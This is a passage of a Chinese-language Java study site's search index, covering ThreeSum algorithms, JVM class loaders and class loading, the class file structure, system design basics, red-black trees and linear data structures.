应该注意这里的下标必须大于 j，否则会重复统计。  if (index \u0026gt; j) { cnt++; } } } return cnt; } } public class BinarySearch { public static int search(int[] nums, int target) { int l = 0, h = nums.length - 1; while (l \u0026lt;= h) { int m = l + (h - l) / 2; if (target == nums[m]) { return m; } else if (target \u0026gt; nums[m]) { l = m + 1; } else { h = m - 1; } } return -1; } } 3. ThreeSumTwoPointer    更有效的方法是先将数组排序，然后使用双指针进行查找，时间复杂度为 O(N2)。\n同样不适用与数组存在重复元素的情况。\npublic class ThreeSumTwoPointer implements ThreeSum { @Override public int count(int[] nums) { int N = nums.length; int cnt = 0; Arrays.sort(nums); for (int i = 0; i \u0026lt; N - 2; i++) { int l = i + 1, h = N - 1, target = -nums[i]; while (l \u0026lt; h) { int sum = nums[l] + nums[h]; if (sum == target) { cnt++; l++; h--; } else if (sum \u0026lt; target) { l++; } else { h--; } } } return cnt; } } 倍率实验    如果 T(N) ~ aNblogN，那么 T(2N)/T(N) ~ 2b。\n例如对于暴力的 ThreeSum 算法，近似时间为 ~N3/6。进行如下实验：多次运行该算法，每次取的 N 值为前一次的两倍，统计每次执行的时间，并统计本次运行时间与前一次运行时间的比值，得到如下结果：\n   N Time(ms) Ratio     500 48 /   1000 320 6.7   2000 555 1.7   4000 4105 7.4   8000 33575 8.2   16000 268909 8.0    可以看到，T(2N)/T(N) ~ 23，因此可以确定 T(N) ~ aN3logN。\npublic class RatioTest { public static void main(String[] args) { int N = 500; int loopTimes = 7; double preTime = -1; while (loopTimes-- \u0026gt; 0) { int[] nums = new int[N]; StopWatch.start(); ThreeSum threeSum = new ThreeSumSlow(); int cnt = threeSum.count(nums); System.out.println(cnt); double elapsedTime = StopWatch.elapsedTime(); double ratio = preTime == -1 ? 0 : elapsedTime / preTime; System.out.println(N + \u0026#34; \u0026#34; + elapsedTime + \u0026#34; \u0026#34; + ratio); preTime = elapsedTime; N *= 2; } } } public class StopWatch { private static long start; public static void start() { start = System.currentTimeMillis(); } public static double elapsedTime() { long now = System.currentTimeMillis(); return (now - start) / 1000.0; } } "},{"id":366,"href":"/java/jvm/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/","title":"类加载器","parent":"jvm","content":"回顾一下类加载过程    类加载过程：加载-\u0026gt;连接-\u0026gt;初始化。连接过程又可分为三步：验证-\u0026gt;准备-\u0026gt;解析。\n一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去自定义类加载器去控制字节流的获取方式（重写一个类加载器的 loadClass() 方法）。数组类型不通过类加载器创建，它由 Java 虚拟机直接创建。\n所有的类都由类加载器加载，加载的作用就是将 .class文件加载到内存。\n类加载器总结    JVM 中内置了三个重要的 ClassLoader，除了 BootstrapClassLoader 其他类加载器均由 Java 实现且全部继承自java.lang.ClassLoader：\n BootstrapClassLoader(启动类加载器) ：最顶层的加载类，由 C++实现，负责加载 %JAVA_HOME%/lib目录下的 jar 包和类或者被 -Xbootclasspath参数指定的路径中的所有类。 ExtensionClassLoader(扩展类加载器) ：主要负责加载 %JRE_HOME%/lib/ext 目录下的 jar 包和类，或被 java.ext.dirs 系统变量所指定的路径下的 jar 包。 AppClassLoader(应用程序类加载器) ：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。  双亲委派模型    双亲委派模型介绍    每一个类都有一个对应它的类加载器。系统中的 ClassLoader 在协同工作的时候会默认使用 双亲委派模型 。即在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。加载的时候，首先会把该请求委派给父类加载器的 loadClass() 处理，因此所有的请求最终都应该传送到顶层的启动类加载器 BootstrapClassLoader 中。当父类加载器无法处理时，才由自己来处理。当父类加载器为 null 时，会使用启动类加载器 BootstrapClassLoader 作为父类加载器。\n每个类加载都有一个父类加载器，我们通过下面的程序来验证。\npublic class ClassLoaderDemo { public static void main(String[] args) { System.out.println(\u0026#34;ClassLodarDemo\u0026#39;s ClassLoader is \u0026#34; + ClassLoaderDemo.class.getClassLoader()); System.out.println(\u0026#34;The Parent of ClassLodarDemo\u0026#39;s ClassLoader is \u0026#34; + ClassLoaderDemo.class.getClassLoader().getParent()); System.out.println(\u0026#34;The GrandParent of ClassLodarDemo\u0026#39;s ClassLoader is \u0026#34; + ClassLoaderDemo.class.getClassLoader().getParent().getParent()); } } Output\nClassLodarDemo's ClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2 The Parent of ClassLodarDemo's ClassLoader is sun.misc.Launcher$ExtClassLoader@1b6d3586 The GrandParent of ClassLodarDemo's ClassLoader is null AppClassLoader的父类加载器为ExtClassLoader， ExtClassLoader的父类加载器为 null，null 并不代表ExtClassLoader没有父类加载器，而是 BootstrapClassLoader 。\n其实这个双亲翻译的容易让别人误解，我们一般理解的双亲都是父母，这里的双亲更多地表达的是“父母这一辈”的人而已，并不是说真的有一个 Mother ClassLoader 和一个 Father ClassLoader 。另外，类加载器之间的“父子”关系也不是通过继承来体现的，是由“优先级”来决定。官方 API 文档对这部分的描述如下:\n The Java platform uses a delegation model for loading classes. The basic idea is that every class loader has a \u0026ldquo;parent\u0026rdquo; class loader. When loading a class, a class loader first \u0026ldquo;delegates\u0026rdquo; the search for the class to its parent class loader before attempting to find the class itself.\n 双亲委派模型实现源码分析    双亲委派模型的实现代码非常简单，逻辑非常清晰，都集中在 java.lang.ClassLoader 的 loadClass() 中，相关代码如下所示。\nprivate final ClassLoader parent; protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // 首先，检查请求的类是否已经被加载过  Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) {//父加载器不为空，调用父加载器loadClass()方法处理  c = parent.loadClass(name, false); } else {//父加载器为空，使用启动类加载器 BootstrapClassLoader 加载  c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { //抛出异常说明父类加载器无法完成加载请求  } if (c == null) { long t1 = System.nanoTime(); //自己尝试加载  c = findClass(name); // this is the defining class loader; record the stats  sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 双亲委派模型的好处    双亲委派模型保证了 Java 程序的稳定运行，可以避免类的重复加载（JVM 区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类），也保证了 Java 的核心 API 不被篡改。如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个称为 java.lang.Object 类的话，那么程序运行的时候，系统就会出现多个不同的 Object 类。\n如果我们不想用双亲委派模型怎么办？    为了避免双亲委托机制，我们可以自己定义一个类加载器，然后重写 loadClass() 即可。\n🐛 修正（参见：issue871 ） ：自定义加载器的话，需要继承 ClassLoader 。如果我们不想打破双亲委派模型，就重写 ClassLoader 类中的 findClass() 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 loadClass() 方法\n自定义类加载器    除了 BootstrapClassLoader 其他类加载器均由 Java 实现且全部继承自java.lang.ClassLoader。如果我们要自定义自己的类加载器，很明显需要继承 ClassLoader。\n推荐阅读     https://blog.csdn.net/xyang81/article/details/7292380 https://juejin.im/post/5c04892351882516e70dcc9b http://gityuan.com/2016/01/24/java-classloader/  "},{"id":367,"href":"/java/jvm/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/","title":"类加载过程","parent":"jvm","content":" 类的生命周期  类加载过程  加载 验证 准备 解析 初始化   卸载 公众号    类的生命周期    一个类的完整生命周期如下：\n类加载过程    Class 文件需要加载到虚拟机中之后才能运行和使用，那么虚拟机是如何加载这些 Class 文件呢？\n系统加载 Class 类型的文件主要三步：加载-\u0026gt;连接-\u0026gt;初始化。连接过程又可分为三步：验证-\u0026gt;准备-\u0026gt;解析。\n详见：jvm规范5.4 。\n加载    类加载过程的第一步，主要完成下面 3 件事情：\n 通过全类名获取定义此类的二进制字节流 将字节流所代表的静态存储结构转换为方法区的运行时数据结构 在内存中生成一个代表该类的 Class 对象，作为方法区这些数据的访问入口  虚拟机规范上面这 3 点并不具体，因此是非常灵活的。比如：\u0026ldquo;通过全类名获取定义此类的二进制字节流\u0026rdquo; 并没有指明具体从哪里获取、怎样获取。比如：比较常见的就是从 ZIP 包中读取（日后出现的 JAR、EAR、WAR 格式的基础）、其他文件生成（典型应用就是 JSP）等等。\n一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的 loadClass() 方法）。数组类型不通过类加载器创建，它由 Java 虚拟机直接创建。\n类加载器、双亲委派模型也是非常重要的知识点，这部分内容会在后面的文章中单独介绍到。\n加载阶段和连接阶段的部分内容是交叉进行的，加载阶段尚未结束，连接阶段可能就已经开始了。\n验证    准备    准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：\n 这时候进行内存分配的仅包括类变量（ Class Variables ，即静态变量，被 static 关键字修饰的变量，只与类相关，因此被称为类变量），而不包括实例变量。实例变量会在对象实例化时随着对象一块分配在 Java 堆中。 从概念上讲，类变量所使用的内存都应当在 方法区 中进行分配。不过有一点需要注意的是：JDK 7 之前，HotSpot 使用永久代来实现方法区的时候，实现是完全符合这种逻辑概念的。 而在 JDK 7 及之后，HotSpot 已经把原本放在永久代的字符串常量池、静态变量等移动到堆中，这个时候类变量则会随着 Class 对象一起存放在 Java 堆中。相关阅读：《深入理解Java虚拟机（第3版）》勘误#75 这里所设置的初始值\u0026quot;通常情况\u0026quot;下是数据类型默认的零值（如 0、0L、null、false 等），比如我们定义了public static int value=111 ，那么 value 变量在准备阶段的初始值就是 0 而不是 111（初始化阶段才会赋值）。特殊情况：比如给 value 变量加上了 final 关键字public static final int value=111 ，那么准备阶段 value 的值就被赋值为 111。  基本数据类型的零值 ： (图片来自《深入理解 Java 虚拟机》第 3 版 7.33 )\n解析    解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用限定符 7 类符号引用进行。\n符号引用就是一组符号来描述目标，可以是任何字面量。直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。在程序实际运行时，只有符号引用是不够的，举个例子：在程序执行方法时，系统需要明确知道这个方法所在的位置。Java 虚拟机为每个类都准备了一张方法表来存放类中所有的方法。当需要调用一个类的方法的时候，只要知道这个方法在方法表中的偏移量就可以直接调用该方法了。通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置，从而使得方法可以被调用。\n综上，解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，也就是得到类或者字段、方法在内存中的指针或者偏移量。\n初始化    初始化阶段是执行初始化方法 \u0026lt;clinit\u0026gt; ()方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。\n 说明： \u0026lt;clinit\u0026gt; ()方法是编译之后自动生成的。\n 对于\u0026lt;clinit\u0026gt; () 方法的调用，虚拟机会自己确保其在多线程环境中的安全性。因为 \u0026lt;clinit\u0026gt; () 方法是带锁线程安全，所以在多线程环境下进行类初始化的话可能会引起多个进程阻塞，并且这种阻塞很难被发现。\n对于初始化阶段，虚拟机严格规范了有且只有 5 种情况下，必须对类进行初始化(只有主动去使用类才会初始化类)：\n 当遇到 new 、 getstatic、putstatic 或 invokestatic 这 4 条直接码指令时，比如 new 一个类，读取一个静态字段(未被 final 修饰)、或调用一个类的静态方法时。  当 jvm 执行 new 指令时会初始化类。即当程序创建一个类的实例对象。 当 jvm 执行 getstatic 指令时会初始化类。即程序访问类的静态变量(不是静态常量，常量会被加载到运行时常量池)。 当 jvm 执行 putstatic 指令时会初始化类。即程序给类的静态变量赋值。 当 jvm 执行 invokestatic 指令时会初始化类。即程序调用类的静态方法。   使用 java.lang.reflect 包的方法对类进行反射调用时如 Class.forname(\u0026quot;...\u0026quot;), newInstance() 等等。如果类没初始化，需要触发其初始化。 初始化一个类，如果其父类还未初始化，则先触发该父类的初始化。 当虚拟机启动时，用户需要定义一个要执行的主类 (包含 main 方法的那个类)，虚拟机会先初始化这个类。 MethodHandle 和 VarHandle 可以看作是轻量级的反射调用机制，而要想使用这 2 个调用， 就必须先使用 findStaticVarHandle 来初始化要调用的类。 「补充，来自issue745」 当一个接口中定义了 JDK8 新加入的默认方法（被 default 关键字修饰的接口方法）时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化。  卸载     卸载这部分内容来自 issue#662由 guang19 补充完善。\n 卸载类即该类的 Class 对象被 GC。\n卸载类需要满足 3 个要求:\n 该类的所有的实例对象都已被 GC，也就是说堆不存在该类的实例对象。 该类没有在其他任何地方被引用 该类的类加载器的实例已被 GC  所以，在 JVM 生命周期内，由 jvm 自带的类加载器加载的类是不会被卸载的。但是由我们自定义的类加载器加载的类是可能被卸载的。\n只要想通一点就好了，jdk 自带的 BootstrapClassLoader, ExtClassLoader, AppClassLoader 负责加载 jdk 提供的类，所以它们(类加载器的实例)肯定不会被回收。而我们自定义的类加载器的实例是可以被回收的，所以使用我们自定义加载器加载的类是可以被卸载掉的。\n参考\n 《深入理解 Java 虚拟机》 《实战 Java 虚拟机》 https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html  公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java 面试突击》: 由本文档衍生的专为面试而生的《Java 面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;Java 面试突击\u0026rdquo; 即可免费领取！\nJava 工程师必备学习资源: 一些 Java 工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":368,"href":"/java/jvm/%E7%B1%BB%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","title":"类文件结构","parent":"jvm","content":" 类文件结构  一 概述 二 Class 文件结构总结  2.1 魔数（Magic Number） 2.2 Class 文件版本号（Minor\u0026amp;Major Version） 2.3 常量池（Constant Pool） 2.4 访问标志(Access Flags) 2.5 当前类（This Class）、父类（Super Class）、接口（Interfaces）索引集合 2.6 字段表集合（Fields） 2.7 方法表集合（Methods） 2.8 属性表集合（Attributes）   参考    类文件结构    一 概述    在 Java 中，JVM 可以理解的代码就叫做字节码（即扩展名为 .class 的文件），它不面向任何特定的处理器，只面向虚拟机。Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效，而且，由于字节码并不针对一种特定的机器，因此，Java 程序无须重新编译便可在多种不同操作系统的计算机上运行。\nClojure（Lisp 语言的一种方言）、Groovy、Scala 等语言都是运行在 Java 虚拟机之上。下图展示了不同的语言被不同的编译器编译成.class文件最终运行在 Java 虚拟机之上。.class文件的二进制格式可以使用 WinHex 查看。\n可以说.class文件是不同的语言在 Java 虚拟机之间的重要桥梁，同时也是支持 Java 跨平台很重要的一个原因。\n二 Class 文件结构总结    根据 Java 虚拟机规范，Class 文件通过 ClassFile 定义，有点类似 C 语言的结构体。\nClassFile 的结构如下：\nClassFile { u4 magic; //Class 文件的标志  u2 minor_version;//Class 的小版本号  u2 major_version;//Class 的大版本号  u2 constant_pool_count;//常量池的数量  cp_info constant_pool[constant_pool_count-1];//常量池  u2 access_flags;//Class 的访问标记  u2 this_class;//当前类  u2 super_class;//父类  u2 interfaces_count;//接口  u2 interfaces[interfaces_count];//一个类可以实现多个接口  u2 fields_count;//Class 文件的字段属性  field_info fields[fields_count];//一个类会可以有多个字段  u2 methods_count;//Class 文件的方法数量  method_info methods[methods_count];//一个类可以有个多个方法  u2 attributes_count;//此类的属性表中的属性数  attribute_info attributes[attributes_count];//属性表集合 } 通过分析 ClassFile 的内容，我们便可以知道 class 文件的组成。\n下面这张图是通过 IDEA 插件 jclasslib 查看的，你可以更直观看到 Class 文件结构。\n使用 jclasslib 不光可以直观地查看某个类对应的字节码文件，还可以查看类的基本信息、常量池、接口、属性、函数等信息。\n下面详细介绍一下 Class 文件结构涉及到的一些组件。\n2.1 魔数（Magic Number）    u4 magic; //Class 文件的标志 每个 Class 文件的头 4 个字节称为魔数（Magic Number）,它的唯一作用是确定这个文件是否为一个能被虚拟机接收的 Class 文件。\n程序设计者很多时候都喜欢用一些特殊的数字表示固定的文件类型或者其它特殊的含义。\n2.2 Class 文件版本号（Minor\u0026amp;Major Version）    u2 minor_version;//Class 的小版本号  u2 major_version;//Class 的大版本号 紧接着魔数的四个字节存储的是 Class 文件的版本号：第 5 和第 6 位是次版本号，第 7 和第 8 位是主版本号。\n每当 Java 发布大版本（比如 Java 8，Java9）的时候，主版本号都会加 1。你可以使用 javap -v 命令来快速查看 Class 文件的版本号信息。\n高版本的 Java 虚拟机可以执行低版本编译器生成的 Class 文件，但是低版本的 Java 虚拟机不能执行高版本编译器生成的 Class 文件。所以，我们在实际开发的时候要确保开发的的 JDK 版本和生产环境的 JDK 版本保持一致。\n2.3 常量池（Constant Pool）    u2 constant_pool_count;//常量池的数量  cp_info constant_pool[constant_pool_count-1];//常量池 紧接着主次版本号之后的是常量池，常量池的数量是 constant_pool_count-1（常量池计数器是从 1 开始计数的，将第 0 项常量空出来是有特殊考虑的，索引值为 0 代表“不引用任何一个常量池项”）。\n常量池主要存放两大常量：字面量和符号引用。字面量比较接近于 Java 语言层面的的常量概念，如文本字符串、声明为 final 的常量值等。而符号引用则属于编译原理方面的概念。包括下面三类常量：\n 类和接口的全限定名 字段的名称和描述符 方法的名称和描述符  常量池中每一项常量都是一个表，这 14 种表有一个共同的特点：开始的第一位是一个 u1 类型的标志位 -tag 来标识常量的类型，代表当前这个常量属于哪种常量类型．\n   类型 标志（tag） 描述     CONSTANT_utf8_info 1 UTF-8 编码的字符串   CONSTANT_Integer_info 3 整形字面量   CONSTANT_Float_info 4 浮点型字面量   CONSTANT_Long_info ５ 长整型字面量   CONSTANT_Double_info ６ 双精度浮点型字面量   CONSTANT_Class_info ７ 类或接口的符号引用   CONSTANT_String_info ８ 字符串类型字面量   CONSTANT_Fieldref_info ９ 字段的符号引用   CONSTANT_Methodref_info 10 类中方法的符号引用   CONSTANT_InterfaceMethodref_info 11 接口中方法的符号引用   CONSTANT_NameAndType_info 12 字段或方法的符号引用   CONSTANT_MothodType_info 16 标志方法类型   CONSTANT_MethodHandle_info 15 表示方法句柄   CONSTANT_InvokeDynamic_info 18 表示一个动态方法调用点    .class 文件可以通过javap -v class类名 指令来看一下其常量池中的信息(javap -v class类名-\u0026gt; temp.txt ：将结果输出到 temp.txt 文件)。\n2.4 访问标志(Access Flags)    在常量池结束之后，紧接着的两个字节代表访问标志，这个标志用于识别一些类或者接口层次的访问信息，包括：这个 Class 是类还是接口，是否为 public 或者 abstract 类型，如果是类的话是否声明为 final 等等。\n类访问和属性修饰符:\n我们定义了一个 Employee 类\npackage top.snailclimb.bean; public class Employee { ... } 通过javap -v class类名 指令来看一下类的访问标志。\n2.5 当前类（This Class）、父类（Super Class）、接口（Interfaces）索引集合    u2 this_class;//当前类  u2 super_class;//父类  u2 interfaces_count;//接口  u2 interfaces[interfaces_count];//一个类可以实现多个接口 类索引用于确定这个类的全限定名，父类索引用于确定这个类的父类的全限定名，由于 Java 语言的单继承，所以父类索引只有一个，除了 java.lang.Object 之外，所有的 java 类都有父类，因此除了 java.lang.Object 外，所有 Java 类的父类索引都不为 0。\n接口索引集合用来描述这个类实现了那些接口，这些被实现的接口将按 implements (如果这个类本身是接口的话则是extends) 后的接口顺序从左到右排列在接口索引集合中。\n2.6 字段表集合（Fields）    u2 fields_count;//Class 文件的字段的个数  field_info fields[fields_count];//一个类会可以有个字段 字段表（field info）用于描述接口或类中声明的变量。字段包括类级变量以及实例变量，但不包括在方法内部声明的局部变量。\nfield info(字段表) 的结构:\n access_flags: 字段的作用域（public ,private,protected修饰符），是实例变量还是类变量（static修饰符）,可否被序列化（transient 修饰符）,可变性（final）,可见性（volatile 修饰符，是否强制从主内存读写）。 name_index: 对常量池的引用，表示的字段的名称； descriptor_index: 对常量池的引用，表示字段和方法的描述符； attributes_count: 一个字段还会拥有一些额外的属性，attributes_count 存放属性的个数； attributes[attributes_count]: 存放具体属性具体内容。  上述这些信息中，各个修饰符都是布尔值，要么有某个修饰符，要么没有，很适合使用标志位来表示。而字段叫什么名字、字段被定义为什么数据类型这些都是无法固定的，只能引用常量池中常量来描述。\n字段的 access_flag 的取值:\n2.7 方法表集合（Methods）    u2 methods_count;//Class 文件的方法的数量  method_info methods[methods_count];//一个类可以有个多个方法 methods_count 表示方法的数量，而 method_info 表示方法表。\nClass 文件存储格式中对方法的描述与对字段的描述几乎采用了完全一致的方式。方法表的结构如同字段表一样，依次包括了访问标志、名称索引、描述符索引、属性表集合几项。\nmethod_info(方法表的) 结构:\n方法表的 access_flag 取值：\n注意：因为volatile修饰符和transient修饰符不可以修饰方法，所以方法表的访问标志中没有这两个对应的标志，但是增加了synchronized、native、abstract等关键字修饰方法，所以也就多了这些关键字对应的标志。\n2.8 属性表集合（Attributes）    u2 attributes_count;//此类的属性表中的属性数  attribute_info attributes[attributes_count];//属性表集合 在 Class 文件，字段表，方法表中都可以携带自己的属性表集合，以用于描述某些场景专有的信息。与 Class 文件中其它的数据项目要求的顺序、长度和内容不同，属性表集合的限制稍微宽松一些，不再要求各个属性表具有严格的顺序，并且只要不与已有的属性名重复，任何人实现的编译器都可以向属性表中写 入自己定义的属性信息，Java 虚拟机运行时会忽略掉它不认识的属性。\n参考     https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html https://coolshell.cn/articles/9229.html https://blog.csdn.net/luanlouis/article/details/39960815 《实战 Java 虚拟机》  "},{"id":369,"href":"/%E7%AC%94%E8%AE%B0/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E7%A1%80/","title":"系统设计基础","parent":"笔记","content":"系统设计基础     系统设计基础  一、性能 二、伸缩性 三、扩展性 四、可用性 五、安全性 参考资料    一、性能    性能指标    1. 响应时间    指某个请求从发出到接收到响应消耗的时间。\n在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。\n2. 吞吐量    指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。\n3. 并发用户数    指系统能同时处理的并发用户请求数量。\n在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。\n目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：\n 多 CPU IO 等待时间  使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。\n并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。\n性能优化    1. 集群    将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。\n2. 缓存    缓存能够提高性能的原因如下：\n 缓存数据通常位于内存等介质中，这种介质对于读操作特别快； 缓存数据可以位于靠近用户的地理位置上； 可以将计算结果进行缓存，从而避免重复计算。  3. 异步    某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。\n二、伸缩性    指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。\n伸缩性与性能    如果系统存在性能问题，那么单个用户的请求总是很慢的；\n如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。\n实现伸缩性    应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。\n关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。\n对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。\n三、扩展性    指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。\n实现可扩展主要有两种方式：\n 使用消息队列进行解耦，应用之间通过消息传递进行通信； 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。  四、可用性    冗余    保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。\n应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。\n存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。\n监控    对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。\n服务降级    服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。\n五、安全性    要求系统在应对各种攻击手段时能够有可靠的应对措施。\n参考资料     大型网站技术架构：核心原理与案例分析  "},{"id":370,"href":"/cs-basics/data-structure/%E7%BA%A2%E9%BB%91%E6%A0%91/","title":"红黑树","parent":"data-structure","content":"红黑树特点 :\n 每个节点非红即黑； 根节点总是黑色的； 每个叶子节点都是黑色的空节点（NIL节点）； 如果节点是红色的，则它的子节点必须是黑色的（反之不一定）； 从根节点到叶节点或空子节点的每条路径，必须包含相同数目的黑色节点（即相同的黑色高度）。  红黑树的应用 ：TreeMap、TreeSet以及JDK1.8的HashMap底层都用到了红黑树。\n为什么要用红黑树？ 简单来说红黑树就是为了解决二叉查找树的缺陷，因为二叉查找树在某些情况下会退化成一个线性结构。详细了解可以查看 漫画：什么是红黑树？（也介绍到了二叉查找树，非常推荐）\n相关阅读 ：《红黑树深入剖析及Java实现》（美团点评技术团队）\n"},{"id":371,"href":"/cs-basics/data-structure/%E7%BA%BF%E6%80%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"线性数据结构","parent":"data-structure","content":"线性数据结构     开头还是求点赞，求转发！原创优质公众号，希望大家能让更多人看到我们的文章。\n图片都是我们手绘的，可以说非常用心了！\n 1. 数组    数组（Array） 是一种很常见的数据结构。它由相同类型的元素（element）组成，并且是使用一块连续的内存来存储。\n我们直接可以利用元素的索引（index）可以计算出该元素对应的存储地址。\n数组的特点是：提供随机访问 并且容量有限。\n假如数组的长度为 n。 访问：O（1）//访问特定位置的元素 插入：O（n ）//最坏的情况发生在插入发生在数组的首部并需要移动所有元素时 删除：O（n）//最坏的情况发生在删除数组的开头发生并需要移动第一元素后面所有的元素时 2. 链表    2.1. 链表简介    链表（LinkedList） 虽然是一种线性表，但是并不会按线性的顺序存储数据，使用的不是连续的内存空间来存储数据。\n链表的插入和删除操作的复杂度为 O(1) ，只需要知道目标位置元素的上一个元素即可。但是，在查找一个节点或者访问特定位置的节点的时候复杂度为 O(n) 。\n使用链表结构可以克服数组需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间,实现灵活的内存动态管理。但链表不会节省空间，相比于数组会占用更多的空间，因为链表中每个节点存放的还有指向其他节点的指针。除此之外，链表不具有数组随机读取的优点。\n2.2. 链表分类    常见链表分类：\n 单链表 双向链表 循环链表 双向循环链表  假如链表中有n个元素。 访问：O（n）//访问特定位置的元素 插入删除：O（1）//必须要要知道插入元素的位置 2.2.1. 单链表    单链表 单向链表只有一个方向，结点只有一个后继指针 next 指向后面的节点。因此，链表这种数据结构通常在物理内存上是不连续的。我们习惯性地把第一个结点叫作头结点，链表通常有一个不保存任何值的 head 节点(头结点)，通过头结点我们可以遍历整个链表。尾结点通常指向 null。\n2.2.2. 循环链表    循环链表 其实是一种特殊的单链表，和单链表不同的是循环链表的尾结点不是指向 null，而是指向链表的头结点。\n2.2.3. 双向链表    双向链表 包含两个指针，一个 prev 指向前一个节点，一个 next 指向后一个节点。\n2.2.4. 双向循环链表    双向循环链表 最后一个节点的 next 指向 head，而 head 的 prev 指向最后一个节点，构成一个环。\n2.3. 应用场景     如果需要支持随机访问的话，链表没办法做到。 如果需要存储的数据元素的个数不确定，并且需要经常添加和删除数据的话，使用链表比较合适。 如果需要存储的数据元素的个数确定，并且不需要经常添加和删除数据的话，使用数组比较合适。  2.4. 数组 vs 链表     数组支持随机访问，而链表不支持。 数组使用的是连续内存空间对 CPU 的缓存机制友好，链表则相反。 数组的大小固定，而链表则天然支持动态扩容。如果声明的数组过小，需要另外申请一个更大的内存空间存放数组元素，然后将原数组拷贝进去，这个操作是比较耗时的！  3. 栈    3.1. 栈简介    栈 (stack)只允许在有序的线性数据集合的一端（称为栈顶 top）进行加入数据（push）和移除数据（pop）。因而按照 后进先出（LIFO, Last In First Out） 的原理运作。在栈中，push 和 pop 的操作都发生在栈顶。\n栈常用一维数组或链表来实现，用数组实现的栈叫作 顺序栈 ，用链表实现的栈叫作 链式栈 。\n假设堆栈中有n个元素。 访问：O（n）//最坏情况 插入删除：O（1）//顶端插入和删除元素 3.2. 栈的常见应用常见应用场景    当我们我们要处理的数据只涉及在一端插入和删除数据，并且满足 后进先出（LIFO, Last In First Out） 的特性时，我们就可以使用栈这个数据结构。\n3.2.1. 实现浏览器的回退和前进功能    我们只需要使用两个栈(Stack1 和 Stack2)和就能实现这个功能。比如你按顺序查看了 1,2,3,4 这四个页面，我们依次把 1,2,3,4 这四个页面压入 Stack1 中。当你想回头看 2 这个页面的时候，你点击回退按钮，我们依次把 4,3 这两个页面从 Stack1 弹出，然后压入 Stack2 中。假如你又想回到页面 3，你点击前进按钮，我们将 3 页面从 Stack2 弹出，然后压入到 Stack1 